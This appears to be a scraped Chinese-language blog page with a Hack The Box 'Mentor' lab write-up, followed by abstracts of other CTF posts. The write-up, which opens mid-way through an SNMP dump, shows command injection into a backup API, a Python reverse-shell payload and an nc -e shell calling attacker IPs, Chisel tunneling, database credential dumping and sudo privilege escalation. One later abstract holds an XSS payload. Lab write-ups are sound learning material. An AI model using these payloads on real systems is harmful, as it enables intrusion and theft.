HOST-RESOURCES-MIB::hrSWRunParameters.1971 = STRING: &quot;-namespace moby -id 9fe6db6386def9ee85a401e564be071bc55984fa0962d8748de5e8d6b1076a30 -address /run/containerd/containerd.sock&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1993 = STRING: &quot;main.py&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.2007 = STRING: &quot;-c from multiprocessing.semaphore_tracker import main;main(4)&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.2008 = STRING: &quot;-c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.2092 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.2110 = STRING: &quot;/usr/local/bin/login.py kj23sadkj123as0-d213&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.26610 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.26614 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.91129 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.91137 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.91143 = STRING: &quot;-c tar -c -f $(nc 10.10.14.89 9001 -e /bin/sh)/app_backkup.tar /app/ &amp;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.91144 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.91148 = STRING: &quot;-c import pty;pty.spawn(\&quot;/bin/sh\&quot;)&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.91149 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.91419 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.91862 = &quot;&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.91958 = STRING: &quot;-k start&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.91959 = STRING: &quot;-k start&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.92142 = &quot;&quot;
</code></pre>
<p>å…¶ä¸­ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªåœ°æ–¹æœ‰äº›æ„æ€</p>
<p><code>: &quot;/usr/local/bin/login.py kj23sadkj123as0-d213&quot;</code></p>
<h3 id="login-as-james">Login as james</h3>
<p>è¿™é‡Œæœ¬æ¥è¯•ç€ç”¨ <code>admin@mentorquotes.htb</code> ç»“æœå‘ç°ä¸è¡Œï¼Œçœ‹äº†æç¤ºæ‰çŸ¥é“æ˜¯docsæœ€ä¸Šé¢è¿˜æ³„æ¼äº†jamesçš„é‚®ç®±ï¼ˆ <code>james@mentorquotes.htb</code> )</p>
<p>ä½¿ç”¨jamesèº«ä»½ç™»å½•</p>
<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303156.png" alt="Untitled" loading="lazy"></figure>
<p>ç„¶åå°†åˆšåˆšdocsä¸‹çš„apiæ¥å£çš„Authorizationéƒ½æ›¿æ¢ä¸ºjamesçš„ï¼Œusersæœ‰è¿”å›ï¼š</p>
<pre><code>{&quot;id&quot;:1,&quot;email&quot;:&quot;james@mentorquotes.htb&quot;,&quot;username&quot;:&quot;james&quot;},{&quot;id&quot;:2,&quot;email&quot;:&quot;svc@mentorquotes.htb&quot;,&quot;username&quot;:&quot;service_acc&quot;}

</code></pre>
<p>è¿˜æœ‰å°±æ˜¯èƒ½ç”¨ <code>/quotes</code> æ¥å£ï¼Œå¾€é‡Œæ–°å¢ä¹‹ç±»çš„</p>
<p>å¦å¤– <code>/admin</code>  ä¹Ÿå¯ä»¥ç”¨å•¦</p>
<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303157.png" alt="Untitled" loading="lazy"></figure>
<h2 id="snmp-public">SNMP - public</h2>
<p>åˆšåˆšçš„å‘½ä»¤æ˜¯è·å–snmpä¸‹ <code>private</code> çš„éƒ¨åˆ†ï¼Œè¿˜æœ‰ <code>public</code> çš„éƒ¨åˆ†å°è¯•è·å–ï¼š</p>
<pre><code class="language-bash">~ snmpbulkwalk -v2c -c public 10.10.11.193                                                                                                                                       0 [11:48:10]
SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (6269914) 17:24:59.14
SNMPv2-MIB::sysContact.0 = STRING: Me &lt;admin@mentorquotes.htb&gt;
SNMPv2-MIB::sysName.0 = STRING: mentor
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (6) 0:00:00.06
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.

HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (6273398) 17:25:33.98
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2023-3-15,3:56:37.0,+0:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: &quot;BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
&quot;
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 235
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
</code></pre>
<h2 id="admin">/admin</h2>
<p>å¯ä»¥çœ‹åˆ°ï¼Œç°åœ¨ç”¨jamesçš„èº«ä»½ï¼Œ/admin è¿”å›</p>
<pre><code>{&quot;admin_funcs&quot;:{&quot;check db connection&quot;:&quot;/check&quot;,&quot;backup the application&quot;:&quot;/backup&quot;}}
</code></pre>
<p>æµ‹è¯• /admin/checkï¼Œ è¿”å›ï¼š {&quot;details&quot;:&quot;Not implemented yet!&quot;}</p>
<p>ç„¶åæµ‹è¯• /admin/backupï¼Œæ ¹æ®responseä¸€ç‚¹ç‚¹æ„é€ </p>
<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303158.png" alt="Untitled" loading="lazy"></figure>
<h3 id="command-injection">command injection</h3>
<p>ä»APIç”Ÿæˆbackupï¼Œè€ƒè™‘åˆ°æœ‰å¯èƒ½å°†ä¼ å…¥çš„pathä½œä¸ºcommandçš„å‚æ•°ï¼Œç„¶åæ‰§è¡Œå‘½ä»¤</p>
<p>æµ‹è¯•å¦‚ä¸‹å‘½ä»¤ï¼š</p>
<pre><code>{
		&quot;path&quot;: &quot;test; wget  http://10.10.14.32 ;&quot;
}
</code></pre>
<p>æœ¬åœ°æ”¶åˆ°</p>
<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303159.png" alt="Untitled" loading="lazy"></figure>
<h2 id="user-flag">User flag</h2>
<p>å‚è€ƒï¼š<a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a> ä¸‹çš„reverse shell cheat sheet</p>
<p>ç”¨bashæ²¡æœ‰æˆåŠŸï¼Œç”¨pythonçš„ï¼ˆå› ä¸ºç½‘ç«™åŸºäºpythonçš„webæ¡†æ¶ï¼‰</p>
<pre><code>{
		&quot;path&quot;: &quot;test;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.14.32\&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);' &quot;
}
</code></pre>
<p>ç„¶åæ˜¯upgrade shell  <code>^Z</code>  åï¼Œè¾“å…¥</p>
<pre><code>stty raw -echo; fg
</code></pre>
<p>åˆ°ç”¨æˆ· $HOMEç›®å½•ä¸‹ï¼Œè·å–user.flag</p>
<h2 id="root-flag">root flag</h2>
<p>åœ¨ <code>/app</code> ç›®å½•ä¸‹æŸ¥çœ‹Dockerfileï¼Œå½“å‰ç½‘ç«™æ˜¯åœ¨å®¹å™¨å†…è¿è¡Œã€‚</p>
<p>Dockerfileçš„å†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="language-docker">FROM python:3.6.9-alpine

RUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev

WORKDIR /app
ENV HOME /home/svc
ENV PATH /home/svc/.local/bin:${PATH}
RUN python -m pip install --upgrade pip --user svc
COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt
RUN pip install pydantic[email] pyjwt
EXPOSE 8000
COPY . .
CMD [&quot;python3&quot;, &quot;-m&quot;, &quot;uvicorn&quot;, &quot;app.main:app&quot;, &quot;--reload&quot;, &quot;--workers&quot;, &quot;100&quot;, &quot;--host&quot;, &quot;0.0.0.0&quot;, &quot;--port&quot; ,&quot;8000&quot;]
</code></pre>
<p>åœ¨ <code>/app/app</code> ä¸‹ï¼Œæœ‰æœ‰å…³è¿™ä¸ªç½‘ç«™çš„å…¨éƒ¨pyä»£ç ï¼Œconfig.pyæ˜¯ç©ºï¼Œä½†æ˜¯db.pyæœ‰ï¼ˆåœ°å€æ˜¯dockerçš„åœ°å€ï¼‰</p>
<pre><code class="language-docker">DATABASE_URL = os.getenv(&quot;DATABASE_URL&quot;, &quot;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db&quot;)
</code></pre>
<p>æƒ³åˆ°ä¹‹å‰åœ¨æ¨çœ‹åˆ°çš„æ–‡ç« ï¼š <a href="https://dmesg.app/ufw-vs-docker.html">https://dmesg.app/ufw-vs-docker.html</a></p>
<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/2023031510.png" alt="Untitled" loading="lazy"></figure>
<p>æˆ‘å¯¹è¿™å—ä¸å¤ªç†Ÿæ‚‰ï¼Œæ‰€ä»¥è¿˜æ˜¯çœ‹äº†å¤§ä½¬çš„writeupçš„æ€è·¯è¿‡ç¨‹ã€‚</p>
<p>ç”¨https://github.com/jpillora/chisel çš„å¼€æº</p>
<p>æ”»å‡»æœºï¼š</p>
<pre><code class="language-docker">./chisel_1.8.1_linux_amd64 server -p 8000 --reverse
</code></pre>
<p>containerï¼š</p>
<p>ç”¨ Chisel å·¥å…·å»ºç«‹ä¸€ä¸ªåå‘éš§é“ï¼ˆ8000ç«¯å£ï¼‰ï¼Œå°†æœ¬åœ°å®¢æˆ·ç«¯çš„ 5432 ç«¯å£æ˜ å°„åˆ°è¿œç¨‹æœåŠ¡å™¨ 172.22.0.1 çš„ 5432 ç«¯å£ã€‚</p>
<pre><code class="language-docker">./chisel_1.8.1_linux_amd64 client 10.10.14.32:8000 R:5432:172.22.0.1:5432
</code></pre>
<h3 id="connect-to-database">connect to database</h3>
<p>å‘½ä»¤</p>
<pre><code class="language-docker">psql -h 127.0.0.1 -p 5432 -U postgres
</code></pre>
<p>å¯†ç ä¹Ÿæ˜¯postgresã€‚è¾“å…¥ <code>\list</code> æŸ¥çœ‹å…¨éƒ¨databaseï¼Œå‘ç° mentorquotes_db</p>
<ol>
<li><code>\connect mentorquotes_db</code>  è¿æ¥åˆ°æ•°æ®åº“</li>
<li><code>\dt</code></li>
</ol>
<pre><code class="language-docker">mentorquotes_db=# \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres 
</code></pre>
<ol>
<li><code>select * from xxx</code></li>
</ol>
<pre><code class="language-docker">mentorquotes_db=# select * from users;
id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
</code></pre>
<p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ç›´æ¥è¯¥modelsï¼ŒåŠ ä¸ªpasswordçš„å­—æ®µã€‚è¿™æ ·è®¿é—®apiçš„/usersä¼šè¿”å›å¯†ç </p>
<p>å¯†ç æ˜¯ ï¼š svc@mentorquotes.htb  /  <code>123meunomeeivani</code></p>
<h3 id="ææƒ">ææƒ</h3>
<p>æŸ¥çœ‹ <code>/etc/snmp</code> ç›®å½•ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤å»æŸ¥çœ‹ç›¸å…³çš„snmpé…ç½®ï¼ˆå»é™¤æ‰æ³¨é‡Šï¼‰</p>
<pre><code class="language-docker">/etc/snmp$ cat snmpd.conf | grep -v &quot;^#&quot; | grep .
</code></pre>
<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/2023031511.png" alt="Untitled" loading="lazy"></figure>
<p>å¯†ç æ˜¯ï¼š <code>SuperSecurePassword123__</code></p>
<p>ç™»å½•å <code>sudo -l</code> æŸ¥çœ‹æƒé™</p>
<pre><code class="language-docker">sudo /bin/sh
</code></pre>
<h2 id="reference">Reference</h2>
<ul>
<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug</a></li>
<li><a href="https://www.daehee.com/werkzeug-console-pin-exploit/">https://www.daehee.com/werkzeug-console-pin-exploit/</a></li>
<li><a href="https://0xdf.gitlab.io/2023/03/11/htb-mentor.html">https://0xdf.gitlab.io/2023/03/11/htb-mentor.html</a></li>
</ul>

      </div>
      <div class="post-info">
        <span><i class="icon icon-calendar-outline"></i> 2023-03-15</span>
        
          <span>
            <i class="icon icon-pricetags-outline"></i>
            
              <a href="https://1dayluo.github.io/tag/5CW47rOjA1/">
                å­¦ä¹ ç¬”è®°
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/Svnemmt1vn/">
                åˆ·é¢˜
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/iAzsp2lm0F/">
                HTB
                
              </a>
            
          </span>
        
      </div>
    </div>
    
  </section>

<section class="post-item">
    <div class="content">
      <a href="https://1dayluo.github.io/post/htbforgot/">
        <h2 class="post-title">HTB:Forgot</h2>
      </a>
      <div class="post-abstract">
        
      </div>
      <div class="post-info">
        <span><i class="icon icon-calendar-outline"></i> 2023-03-09</span>
        
          <span>
            <i class="icon icon-pricetags-outline"></i>
            
              <a href="https://1dayluo.github.io/tag/5CW47rOjA1/">
                å­¦ä¹ ç¬”è®°
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/np12zpe3Rf/">
                é¶åœº
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/Svnemmt1vn/">
                åˆ·é¢˜
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/iAzsp2lm0F/">
                HTB
                
              </a>
            
          </span>
        
      </div>
    </div>
    
  </section>

<section class="post-item">
    <div class="content">
      <a href="https://1dayluo.github.io/post/htbyi-dao-she-ji-dns-rebinding-attack-de-ti-wei-zuo-chu-lai/">
        <h2 class="post-title">[HTB]ä¸€é“æ¶‰åŠDNS Rebinding attackçš„é¢˜(æœªåšå‡ºæ¥)</h2>
      </a>
      <div class="post-abstract">
        <h1 id="baby-cachedview-æ²¡åšå‡ºæ¥">baby CachedView (æ²¡åšå‡ºæ¥)</h1>
<p>é¢˜ç›®æä¾›çš„Dockerfileä¸‹è½½cffiçš„æ—¶å€™æŠ¥é”™,éœ€è¦ä¸‹è½½libcairo2-dev gcc<br>
æš‚æ—¶ä¸æ‰“ç®—åšäº†.æœåŠ¡å™¨ä¹‹å‰ç™½å«–äº†ä¸€ä¸ªipv6çš„å°é¸¡,ä½†æ˜¯è€å®è¯´è‡ªå·±ä¸æ€ä¹ˆä¼šç©= =å¥½åƒè¿ipv6å¥½åªèƒ½æ‰‹æœºä¸‹ä¸€ä¸ª1.1.1.1çš„vpn.......å¼„pythonç¯å¢ƒåˆè´¹å¥½é•¿æ—¶é—´.å¤ªè´¹æ—¶é—´äº†.ä¸»è¦è®°å½•ä¸€ä¸‹æ€è·¯</p>

      </div>
      <div class="post-info">
        <span><i class="icon icon-calendar-outline"></i> 2022-01-07</span>
        
          <span>
            <i class="icon icon-pricetags-outline"></i>
            
              <a href="https://1dayluo.github.io/tag/Svnemmt1vn/">
                åˆ·é¢˜
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/iAzsp2lm0F/">
                HTB
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/hkZZrvn-OU4/">
                web
                
              </a>
            
          </span>
        
      </div>
    </div>
    
  </section>

<section class="post-item">
    <div class="content">
      <a href="https://1dayluo.github.io/post/htb-weather-App/">
        <h2 class="post-title"> [HTB] åˆä¸€é“writeup:Weather | æ”¶è·é¢‡å¤š</h2>
      </a>
      <div class="post-abstract">
        <h1 id="weather-app">Weather App</h1>
<p>è¿™é“é¢˜å€¼å¾—æ…¢æ…¢å•ƒ,å¦‚æœæœ‰ç¼˜çœ‹åˆ°æˆ‘è¿™ç¯‡writeupçš„è¯,å»ºè®®ä½ å®åœ¨å•ƒä¸ä¸‹å†çœ‹(æˆ–è€…åªçœ‹å¡ä½çš„åœ°æ–¹)</p>
<h2 id="é¢˜ç›®åˆ†æ">é¢˜ç›®åˆ†æ</h2>
<p>ä¸ç®¡ç”¨burpæŠ“åŒ…,è¿˜æ˜¯åˆ†ææºä»£ç .å‡å¯ä»¥çœ‹åˆ°,å¤©æ°”çš„è·å–ä»¥POSTæ–¹å¼è¯·æ±‚äº†<code>/api/weather</code> æ¥å£(æºä»£ç è§<code>/static/js/main.js</code> )</p>
<p>çœ‹æºä»£ç è¿›è¡Œå®¡è®¡çš„æ—¶å€™,è¿˜å‘ç°äº†åœ¨<code>/static/host-unreachable.jpg</code> ä¸‹çš„ä¸€ä¸ªå›¾ç‰‡</p>

      </div>
      <div class="post-info">
        <span><i class="icon icon-calendar-outline"></i> 2021-12-22</span>
        
          <span>
            <i class="icon icon-pricetags-outline"></i>
            
              <a href="https://1dayluo.github.io/tag/np12zpe3Rf/">
                é¶åœº
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/Svnemmt1vn/">
                åˆ·é¢˜
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/iAzsp2lm0F/">
                HTB
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/hkZZrvn-OU4/">
                web
                
              </a>
            
          </span>
        
      </div>
    </div>
    
  </section>

<section class="post-item">
    <div class="content">
      <a href="https://1dayluo.github.io/post/htbphonebook-or-writeup/">
        <h2 class="post-title">[HTB]phonebook | writeup</h2>
      </a>
      <div class="post-abstract">
        <p>è¾“å…¥é”™è¯¯çš„ç”¨æˆ·åå’Œå¯†ç ,å‘ç°æç¤ºæƒé™å¤±è´¥çš„messageæ˜¯é€šè¿‡urlä¼ è¾“çš„,æ„é€ payloadå¼•èµ·alertçš„å¼¹çª—</p>
<p>payload : <a href="http://178.62.5.61:31279/login?message=%3Cimg%20src=1%20onerror=alert(123)%3E"><code>http://178.62.5.61:31279/login?message=&lt;img src=1 onerror=alert(123)&gt;</code></a></p>
<p>ä½†æ˜¯è¿˜æ˜¯éœ€è¦ç™»é™†çš„,åœ¨ç™»é™†é¡µé¢è¾“å…¥wildcardsçš„'<em>'(ç”¨æˆ·åå’Œå¯†ç å‡æ˜¯).å› ä¸ºæ²¡æœ‰å‰é¢çš„è¿‡æ»¤,ç›´æ¥æŠŠ</em>ä¼ é€’åˆ°åå°,æ‰€ä»¥å°±èƒ½ç™»é™†è¿›å»äº†.</p>
<p>è¿›è¡Œcode review.å‘ç°è¯·æ±‚äº†ä¸€ä¸ª/search çš„api,å¦‚æœæˆåŠŸ,å°±æ˜¾ç¤ºsearchåçš„ç»“æœ(ä»¥tableçš„æ–¹å¼)</p>

      </div>
      <div class="post-info">
        <span><i class="icon icon-calendar-outline"></i> 2021-12-15</span>
        
          <span>
            <i class="icon icon-pricetags-outline"></i>
            
              <a href="https://1dayluo.github.io/tag/np12zpe3Rf/">
                é¶åœº
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/Svnemmt1vn/">
                åˆ·é¢˜
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/iAzsp2lm0F/">
                HTB
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/hkZZrvn-OU4/">
                web
                
              </a>
            
          </span>
        
      </div>
    </div>
    
  </section>

<section class="post-item">
    <div class="content">
      <a href="https://1dayluo.github.io/post/htb-templated-or-writeup/">
        <h2 class="post-title">[HTB] Templated | writeup</h2>
      </a>
      <div class="post-abstract">
        <h1 id="templated">Templated</h1>
<p>æ˜¯sstiæ¼æ´.</p>
<p>ä½†æ˜¯ä¹‹å‰å­¦ä¹ burpsuiteä¸‹çš„é¢˜ç›®çš„æ—¶å€™,æ²¡æœ‰å­¦åˆ°è¿™ä¸ª.ä¹‹å‰äº†è§£è¿‡æ¦‚å¿µ.äºæ˜¯æˆ‘ä¸“é—¨å›é¡¾å’Œå­¦ä¹ äº†ä¸€ä¸‹jinja2</p>
<p>å°è¯•è®¿é—®ä¸å­˜åœ¨çš„è·¯å¾„:</p>
<pre><code>payload : /xyz

response : å‘ç°ä¼šå›æ˜¾xyzåœ¨é¡µé¢ä¸­
</code></pre>

      </div>
      <div class="post-info">
        <span><i class="icon icon-calendar-outline"></i> 2021-12-15</span>
        
          <span>
            <i class="icon icon-pricetags-outline"></i>
            
              <a href="https://1dayluo.github.io/tag/np12zpe3Rf/">
                é¶åœº
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/Svnemmt1vn/">
                åˆ·é¢˜
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/iAzsp2lm0F/">
                HTB
                
                  ï¼Œ
                
              </a>
            
              <a href="https://1dayluo.github.io/tag/hkZZrvn-OU4/">
                web
                
              </a>
            
          </span>
        
      </div>
    </div>
    
  </section>

<section class="post-item">
    <div class="content">
      <a href="https://1dayluo.github.io/post/shua-ti-shui-ti-memcache-an-quan-xiang-guan/">
        <h2 class="post-title">[åˆ·é¢˜]æ°´é¢˜-memcacheå®‰å…¨ç›¸å…³</h2>
      </a>
      <div class="post-abstract">
        <p><strong>å†™åœ¨å¼€å¤´ï¼š</strong></p>
<p>å¿™é‡Œå·é—²åˆ·çš„é¢˜ï¼Œæ‰€ä»¥ä¸­é—´æœ‰é‡å¯labå¯¼è‡´ipå˜æ›´çš„æƒ…å†µã€‚</p>
<h2 id="questions">Questions</h2>
<ol>
<li>Find the version of memcached server using nmap.</li>
<li>Find the version information using netcat or telnet.</li>
<li>Find the maximum number of simultaneous incoming connections allowed by the memcached server use available nmap scripts.</li>
<li>Find the number of current items on the memcached server using memcstat.</li>
<li>Find the value stored in the key 'flag' from the key value pairs dumped by available Metasploit module.</li>
<li>Find the name of all keys present on the memcached server using memcdump.</li>
<li>Find the value stored in key â€œfirst_nameâ€ using memcached-tool.</li>
</ol>

      </div>
      <div class="post-info">
        <span><i class="icon icon-calendar-outline"></i> 2020-12-17</span>
        
          <span>
            <i class="icon icon-pricetags-outline"></i>
            
              <a href="https://1dayluo.github.io/tag/Svnemmt1vn/">
                åˆ·é¢˜
                
              </a>
            
          </span>
        
      </div>
    </div>
    
  </section>


<div class="pagination-container">
  
  
</div>


      </div>

      <div class="site-footer">
  <div class="slogan">ç¢æœˆæ˜Ÿè¾°æ½æ±Ÿé£ , æˆ‘å¿ƒæœ‰å‰‘é—®å¤©æ¶¯ </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
</div>


    </div>
    <script type="application/javascript">

hljs.initHighlightingOnLoad()

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>




  </body>
</html>
